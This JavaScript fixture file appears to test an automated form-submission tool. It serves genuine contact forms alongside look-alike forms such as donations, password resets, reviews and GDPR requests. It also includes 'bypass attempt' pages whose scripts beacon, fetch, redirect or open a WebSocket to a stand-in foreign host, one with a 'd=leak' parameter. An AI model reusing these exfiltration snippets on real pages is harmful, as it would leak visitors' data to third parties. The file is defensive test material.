// Real-world form shapes (WordPress CF7 / Gravity / WPForms, Elementor, HubSpot, GoHighLevel, Shopify) and
// look-alike forms that must never be submitted (donations, reviews, resets, GDPR, forum replies, ...).
// Ported from an independent reviewer's fixtures. Servers listen on ephemeral ports.
import http from 'node:http';

export const GOOD = ['cf7', 'gravity', 'wpforms', 'elementor', 'hubspot', 'shopifyContact', 'ghl', 'booking'];
export const GOOD_SINKS = ['/sink/cf7', '/sink/gravity', '/sink/wpforms', '/sink/elementor', '/sink/hubspot', '/contact', '/sink/ghl', '/sink/bookingNoCard'];
export const NEWSLETTER = ['hubspotNL', 'shopifyNLfooter'];

export const F = {};
const inp = (t, n, x = "") => `<input type="${t}" name="${n}" ${x}>`;
// real lead forms (SHOULD be submitted)
F.cf7 = `<div class="wpcf7" id="wpcf7-f123-p5-o1"><form action="/sink/cf7#wpcf7-f123-p5-o1" method="post" class="wpcf7-form init"><input type="hidden" name="_wpcf7" value="123"><p><label>Your name ${inp("text", "your-name")}</label></p><p><label>Your email ${inp("email", "your-email")}</label></p><p><label>Your message<textarea name="your-message"></textarea></label></p><input type="submit" value="Send" class="wpcf7-submit"></form></div>`;
F.gravity = `<div class="gform_wrapper" id="gform_wrapper_1"><form method="post" id="gform_1" action="/sink/gravity"><div class="gform_body"><ul><li><label for="input_1_1">Name</label>${inp("text", "input_1", 'id="input_1_1"')}</li><li><label for="input_1_2">Email</label>${inp("email", "input_2", 'id="input_1_2"')}</li><li><label for="input_1_3">Message</label><textarea name="input_3" id="input_1_3"></textarea></li></ul></div><input type="submit" id="gform_submit_button_1" class="gform_button" value="Submit"><input type="hidden" name="gform_submit" value="1"></form></div>`;
F.wpforms = `<div class="wpforms-container" id="wpforms-9"><form id="wpforms-form-9" class="wpforms-validate wpforms-form" method="post" action="/sink/wpforms"><input name="wpforms[fields][0]" type="text" placeholder="Name" class="wpforms-field-large"><input name="wpforms[fields][1]" type="email" placeholder="Email"><textarea name="wpforms[fields][2]" placeholder="Comment or Message"></textarea><button type="submit" class="wpforms-submit">Submit</button></form></div>`;
F.elementor = `<form class="elementor-form" method="post" name="New Form" action="/sink/elementor"><input type="hidden" name="post_id" value="5"><input type="hidden" name="form_id" value="abc"><input size="1" type="text" name="form_fields[name]" id="form-field-name" placeholder="Name"><input size="1" type="email" name="form_fields[email]" id="form-field-email" placeholder="Email"><textarea name="form_fields[message]" id="form-field-message" placeholder="Message"></textarea><button type="submit" class="elementor-button"><span>Send</span></button></form>`;
F.hubspot = `<div class="hbspt-form"><form id="hsForm_abc" method="POST" accept-charset="UTF-8" action="/sink/hubspot" class="hs-form-private hsForm_abc hs-form stacked"><div class="hs_firstname hs-firstname"><label>First Name</label><input id="firstname-abc" name="firstname" type="text" class="hs-input"></div><div><label>Email</label><input id="email-abc" name="email" type="email" class="hs-input"></div><div><label>How can we help?</label><textarea name="message" class="hs-input"></textarea></div><input type="submit" class="hs-button primary large" value="Submit"></form></div>`;
F.hubspotNL = `<form id="hsForm_nl" method="POST" action="/sink/hubspotNL" class="hs-form"><input name="email" type="email" class="hs-input"><input type="submit" value="Subscribe" class="hs-button"></form>`;
F.shopifyContact = `<form method="post" action="/contact#contact_form" id="contact_form" accept-charset="UTF-8" class="contact-form"><input type="hidden" name="form_type" value="contact"><input type="hidden" name="utf8" value="x"><label>Name</label><input type="text" id="ContactForm-name" name="contact[name]"><label>Email</label><input type="email" id="ContactForm-email" name="contact[email]" autocomplete="email"><label>Phone number</label><input type="tel" name="contact[phone]"><label>Comment</label><textarea name="contact[body]" id="ContactForm-body"></textarea><button type="submit">Send</button></form>`;
F.ghl = `<form class="form-builder--wrapper" id="inline-form-ghl" method="post" action="/sink/ghl"><input name="first_name" type="text" placeholder="First Name"><input name="email" type="email" placeholder="Email"><input name="phone" type="tel" placeholder="Phone"><button type="submit" class="submit-button">Submit</button></form>`;
F.booking = `<form action="/sink/bookingNoCard" method="post"><input name="fullname" placeholder="Your name"><input type="email" name="email"><input type="tel" name="phone"><input type="date" name="date"><textarea name="notes" placeholder="Notes"></textarea><button>Request booking</button></form>`;
// should NOT be submitted
F.shopifyCart = `<form action="/cart" method="post" novalidate class="cart"><input type="hidden" name="attributes[x]" value=""><input type="number" name="updates[]" value="1"><textarea name="note" placeholder="Special instructions"></textarea><button type="submit" name="checkout">Check out</button></form>`;
F.shopifyAdd = `<form method="post" action="/cart/add" id="product-form"><input type="hidden" name="id" value="123"><input type="number" name="quantity" value="1"><button type="submit" name="add">Add to cart</button></form>`;
F.shopifyRecover = `<form method="post" action="/account/recover"><input type="email" name="email"><button>Submit</button></form>`;
F.shopifyNLfooter = `<form method="post" action="/contact#newsletter" id="ContactFooter"><input type="hidden" name="form_type" value="customer"><input type="email" name="contact[email]" placeholder="Email"><button>Subscribe</button></form>`;
F.donation = `<form action="/sink/donate" method="post" class="give-form"><label>Donation amount</label><input type="text" name="amount" value="25"><input name="name" placeholder="Name"><input type="email" name="email"><textarea name="note" placeholder="Message"></textarea><button>Give now</button></form>`;
F.donation2 = `<form action="/sink/donate2" method="post"><input type="text" name="custom_amount" placeholder="$"><input name="first_name"><input type="email" name="email"><button>Support us</button></form>`;
F.job = `<form action="/sink/job" method="post" enctype="multipart/form-data"><input name="name"><input type="email" name="email"><textarea name="cover"></textarea><input type="file" name="resume"><button>Apply</button></form>`;
F.jobNoFile = `<form action="/sink/jobNoFile" method="post" class="careers-apply"><input name="name"><input type="email" name="email"><input type="url" name="linkedin"><textarea name="cover_letter" placeholder="Why do you want to join?"></textarea><button>Apply for this position</button></form>`;
F.bookingCard = `<form action="/sink/bookingCard" method="post"><input name="name"><input type="email" name="email"><input type="date" name="date"><input name="number" autocomplete="cc-number"><button>Book</button></form>`;
F.bookingCard2 = `<form action="/sink/bookingCard2" method="post"><input name="name"><input type="email" name="email"><input type="tel" name="phone"><div id="card-element"></div><button>Reserve and pay deposit</button></form>`;
F.reset = `<form action="/sink/pwreset" method="post"><label>Enter your email to receive a reset link</label><input type="email" name="user_email"><button>Send reset link</button></form>`;
F.reset2 = `<form action="/sink/pwreset2" method="post" id="recover"><input type="email" name="email"><input name="name"><button>Email me a link</button></form>`;
F.gdpr = `<form action="/sink/gdpr" method="post" class="privacy-request"><input name="name"><input type="email" name="email"><textarea name="details" placeholder="Describe your request"></textarea><button>Submit request</button></form>`;
F.gdpr2 = `<form action="/sink/gdpr2" method="post"><label>Full name</label><input name="name"><label>Email</label><input type="email" name="email"><select name="type"><option value="access">Access</option><option value="erase">Erase my data</option></select><button>Submit</button></form>`;
F.forum = `<form action="/sink/forumreply" method="post" class="bbp-reply-form"><input name="bbp_anonymous_name" placeholder="Name"><input type="email" name="bbp_anonymous_email"><textarea name="bbp_reply_content"></textarea><button>Submit</button></form>`;
F.forum2 = `<form action="/sink/forum2" method="post" id="reply"><input name="name"><input type="email" name="email"><textarea name="message" placeholder="Your reply"></textarea><button>Post reply</button></form>`;
F.review = `<form action="/sink/review" method="post" id="reviewform"><select name="rating"><option value="5">5</option><option value="1">1</option></select><input name="author" placeholder="Name"><input type="email" name="email"><textarea name="review"></textarea><button>Submit review</button></form>`;
F.review2 = `<form action="/sink/review2" method="post"><input name="name"><input type="email" name="email"><input type="number" name="rating"><textarea name="message" placeholder="Share your experience"></textarea><button>Post review</button></form>`;
F.testimonial = `<form action="/sink/testi" method="post" class="submit-testimonial"><input name="name"><input type="email" name="email"><textarea name="message"></textarea><button>Share your story</button></form>`;
F.guestbook = `<form action="/sink/guest" method="post"><input name="name"><input type="email" name="email"><textarea name="message"></textarea><button>Sign guestbook</button></form>`;
F.rsvp = `<form action="/sink/rsvp" method="post"><input name="name"><input type="email" name="email"><button>RSVP</button></form>`;
F.waitlist = `<form action="/sink/waitlist" method="post"><input name="name"><input type="email" name="email"><button>Join waitlist</button></form>`;
F.webinar = `<form action="/sink/webinar" method="post"><input name="name"><input type="email" name="email"><button>Register for webinar</button></form>`;
F.report = `<form action="/sink/report" method="post"><input name="name"><input type="email" name="email"><textarea name="message"></textarea><button>Report this listing</button></form>`;
F.refund = `<form action="/sink/refund" method="post"><input name="name"><input type="email" name="email"><input name="order_number"><textarea name="message"></textarea><button>Request refund</button></form>`;
F.cancel = `<form action="/sink/cancel" method="post"><input name="name"><input type="email" name="email"><textarea name="message"></textarea><button>Cancel my subscription</button></form>`;
F.typeform = `<iframe src="http://127.0.0.1:__P__/embed/typeform" width=400 height=300></iframe>`;
F.jotform = `<iframe src="http://127.0.0.1:__P__/embed/jotform" width=400 height=300></iframe>`;
// review page under a /reviews/ url with generic form
F["reviews-page"] = `<form action="/sink/genericOnReviewsPage" method="post"><input name="name"><input type="email" name="email"><textarea name="message"></textarea><button>Submit</button></form>`;
// generic-named forms where only the button/label says what it is
F.postcomment = `<form action="/sink/postcomment" method="post"><input name="name"><input type="email" name="email"><textarea name="message"></textarea><button>Post your comment</button></form>`;
F.donate3 = `<form action="/sink/donate3" method="post"><input name="name"><input type="email" name="email"><input type="radio" name="gift" value="25" checked><input type="radio" name="gift" value="50"><button>Donate $25</button></form>`;

/** @returns {Promise<{url:string, hits:string[], close:()=>Promise<void>}>} hits = POST paths received */
export function startVendorSite() {
  const hits = [];
  const srv = http.createServer((q, r) => {
    const u = new URL(q.url, 'http://x');
    if (q.method === 'POST') {
      q.resume();
      q.on('end', () => {
        hits.push(u.pathname);
        r.writeHead(200, { 'content-type': 'text/html' });
        r.end('<p>Thank you, your message has been sent</p>');
      });
      return;
    }
    if (u.pathname === '/robots.txt') { r.writeHead(404); return r.end(); }
    if (u.pathname === '/') {
      r.writeHead(200, { 'content-type': 'text/html' });
      return r.end('<h1>Home</h1>' + Object.keys(F).map((k) => `<a href="/p/${k}">${k}</a>`).join(' '));
    }
    const m = u.pathname.match(/^\/p\/(.+)/);
    if (m && F[m[1]]) {
      r.writeHead(200, { 'content-type': 'text/html' });
      return r.end(`<title>${m[1]}</title><h1>${m[1]}</h1>` + F[m[1]].replaceAll('__P__', srv.address().port));
    }
    if (u.pathname.startsWith('/embed/')) {
      r.writeHead(200, { 'content-type': 'text/html' });
      return r.end(`<form action="/sink/embed${u.pathname}" method="post"><input name="n"><input type="email" name="e"><textarea name="m"></textarea><button>Send</button></form>`);
    }
    r.writeHead(200, { 'content-type': 'text/html' });
    r.end('ok');
  });
  return new Promise((resolve) => srv.listen(0, '127.0.0.1', () => resolve({ url: `http://127.0.0.1:${srv.address().port}/`, hits, close: () => new Promise((r) => srv.close(r)) })));
}

// Bypass attempts: every one of these is a legitimate-looking lead form whose page or server tries to
// reach another host (fetch, beacon, XHR, popup, redirect, service worker, image GET, websocket ...).
export const ATTACKS = {
  fetchForeign: `<form id=f action="/sink/a1" method="post"><input name="name"><input type="email" name="email"><textarea name="message"></textarea><button>Send</button></form><script>document.getElementById('f').addEventListener('submit',()=>{fetch('__FOREIGN__/fetch',{method:'POST',body:'x',mode:'no-cors'});});</script>`,
  beacon: `<form id=f action="/sink/a2" method="post"><input name="name"><input type="email" name="email"><textarea name="message"></textarea><button>Send</button></form><script>document.getElementById('f').addEventListener('submit',()=>{navigator.sendBeacon('__FOREIGN__/beacon','x');});</script>`,
  xhr: `<form id=f action="/sink/a3" method="post"><input name="name"><input type="email" name="email"><textarea name="message"></textarea><button>Send</button></form><script>document.getElementById('f').addEventListener('submit',()=>{var x=new XMLHttpRequest();x.open('POST','__FOREIGN__/xhr');x.send('x');});</script>`,
  targetBlank: `<form action="/sink/a4" method="post" target="_blank"><input name="name"><input type="email" name="email"><textarea name="message"></textarea><button>Send</button></form>`,
  windowOpen: `<form id=f action="/sink/a5" method="post"><input name="name"><input type="email" name="email"><textarea name="message"></textarea><button>Send</button></form><script>document.getElementById('f').addEventListener('submit',()=>{window.open('__FOREIGN__/winopen','_blank');});</script>`,
  metaRefresh: `<form action="/sink/metaref" method="post"><input name="name"><input type="email" name="email"><textarea name="message"></textarea><button>Send</button></form>`,
  redirect307: `<form action="/sink/redir307" method="post"><input name="name"><input type="email" name="email"><textarea name="message"></textarea><button>Send</button></form>`,
  redirectChain: `<form action="/sink/chain1" method="post"><input name="name"><input type="email" name="email"><textarea name="message"></textarea><button>Send</button></form>`,
  sw: `<script>navigator.serviceWorker.register('/sw.js');</script><form id=f action="/sink/a8" method="post"><input name="name"><input type="email" name="email"><textarea name="message"></textarea><button>Send</button></form><script>document.getElementById('f').addEventListener('submit',e=>{e.preventDefault();navigator.serviceWorker.ready.then(()=>fetch('/swproxy',{method:'POST',body:'x'}).then(()=>{location='/thanks'}));});</script>`,
  imgGet: `<form id=f action="/sink/a9" method="post"><input name="name"><input type="email" name="email"><textarea name="message"></textarea><button>Send</button></form><script>document.getElementById('f').addEventListener('submit',()=>{new Image().src='__FOREIGN__/img?d=leak';});</script>`,
  formSubmitProg: `<form id=f action="/sink/a10" method="post"><input name="name"><input type="email" name="email"><textarea name="message"></textarea><button>Send</button></form><script>document.getElementById('f').addEventListener('submit',()=>{var g=document.createElement('form');g.method='post';g.action='__FOREIGN__/dynform';document.body.appendChild(g);g.submit();});</script>`,
  actionJs: `<form id=f action="/sink/a11" method="post"><input name="name"><input type="email" name="email"><textarea name="message"></textarea><button>Send</button></form><script>document.getElementById('f').addEventListener('submit',()=>{setTimeout(()=>{location.href='__FOREIGN__/locnav'},50);});</script>`,
  wsock: `<form id=f action="/sink/a12" method="post"><input name="name"><input type="email" name="email"><textarea name="message"></textarea><button>Send</button></form><script>document.getElementById('f').addEventListener('submit',()=>{try{new WebSocket('ws://__FOREIGN_HOSTPORT__/ws')}catch(e){}});</script>`,
};

const SW_SOURCE = (foreign) => `self.addEventListener('fetch',e=>{ if(e.request.url.endsWith('/swproxy')){ e.respondWith(fetch('${foreign}/swforeign',{method:'POST',body:'x',mode:'no-cors'}).then(()=>new Response('ok')).catch(()=>new Response('ok'))); } });`;

/** Starts the main site and a "foreign" server. Every request the foreign server sees is a failure. */
export async function startAttackSites() {
  const hits = [];
  const foreignHits = [];
  let FOREIGN = '';
  let FOREIGN_HOSTPORT = '';
  const main = http.createServer((q, r) => {
    const u = new URL(q.url, 'http://x');
    if (q.method === 'POST') {
      q.resume();
      q.on('end', () => {
        hits.push('main ' + u.pathname);
        if (u.pathname === '/sink/redir307') { r.writeHead(307, { location: FOREIGN + '/r307' }); return r.end(); }
        if (u.pathname === '/sink/chain1') { r.writeHead(303, { location: '/hop2' }); return r.end(); }
        if (u.pathname === '/sink/metaref') { r.writeHead(200, { 'content-type': 'text/html' }); return r.end(`<meta http-equiv=refresh content="0;url=${FOREIGN}/meta">Thank you, sent`); }
        r.writeHead(200, { 'content-type': 'text/html' });
        r.end('<p>Thank you, your message has been sent</p>');
      });
      return;
    }
    if (u.pathname === '/robots.txt') { r.writeHead(404); return r.end(); }
    if (u.pathname === '/sw.js') { r.writeHead(200, { 'content-type': 'text/javascript' }); return r.end(SW_SOURCE(FOREIGN)); }
    if (u.pathname === '/hop2') { r.writeHead(307, { location: FOREIGN + '/hop3' }); return r.end(); }
    if (u.pathname === '/') {
      r.writeHead(200, { 'content-type': 'text/html' });
      return r.end('<h1>Home</h1>' + Object.keys(ATTACKS).map((k) => `<a href="/p/${k}">${k}</a>`).join(' '));
    }
    const m = u.pathname.match(/^\/p\/(.+)/);
    if (m && ATTACKS[m[1]]) {
      r.writeHead(200, { 'content-type': 'text/html' });
      return r.end(`<title>${m[1]}</title><h1>${m[1]}</h1>` + ATTACKS[m[1]].replaceAll('__FOREIGN_HOSTPORT__', FOREIGN_HOSTPORT).replaceAll('__FOREIGN__', FOREIGN));
    }
    r.writeHead(200, { 'content-type': 'text/html' });
    r.end('ok');
  });
  const foreign = http.createServer((q, r) => {
    foreignHits.push(`${q.method} ${q.url}`);
    r.writeHead(200, { 'access-control-allow-origin': '*' });
    r.end('ok');
  });
  foreign.on('upgrade', (q, s) => {
    foreignHits.push(`WS ${q.url}`);
    s.destroy();
  });
  await new Promise((r) => foreign.listen(0, '127.0.0.1', r));
  FOREIGN_HOSTPORT = `127.0.0.1:${foreign.address().port}`;
  FOREIGN = `http://${FOREIGN_HOSTPORT}`;
  await new Promise((r) => main.listen(0, '127.0.0.1', r));
  return {
    url: `http://127.0.0.1:${main.address().port}/`,
    hits,
    foreignHits,
    close: async () => {
      await new Promise((r) => main.close(r));
      await new Promise((r) => foreign.close(r));
    },
  };
}
